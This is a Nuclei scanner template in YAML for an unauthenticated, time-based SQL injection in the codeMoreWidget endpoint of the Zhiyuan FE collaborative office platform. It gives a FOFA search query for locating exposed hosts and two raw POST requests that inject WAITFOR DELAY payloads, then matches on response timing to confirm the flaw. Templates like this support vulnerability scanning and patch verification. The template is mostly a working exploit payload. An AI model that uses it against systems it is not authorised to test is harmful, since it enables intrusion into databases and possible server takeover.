id: zhiyuanhulianFE-codeMoreWidget-sql-injection

info:
  name: 致远互联FE协作办公平台 codeMoreWidget SQL延时注入
  author: unknown
  severity: high
  description: |-
    fofa: body="li_plugins_download"
    致远互联FE协作办公平台 codeMoreWidget接口处存在SQL注入漏洞,未经身份验证的攻击者可以通过此漏洞获取数据库敏感信息，深入利用可获取服务器权限。
  tags: sql injection

http:
  - raw:
      - |
        POST /common/codeMoreWidget.js%70 HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        code=-1';WAITFOR DELAY '0:0:3'--

      - |
        POST /common/codeMoreWidget.js%70 HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        code=-1';WAITFOR DELAY '0:0:6'--
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'duration_1>=3 && duration_1<=4'  
          - 'duration_2>=6 && duration_2<=7'  
      - type: status
        status: 
          - 200





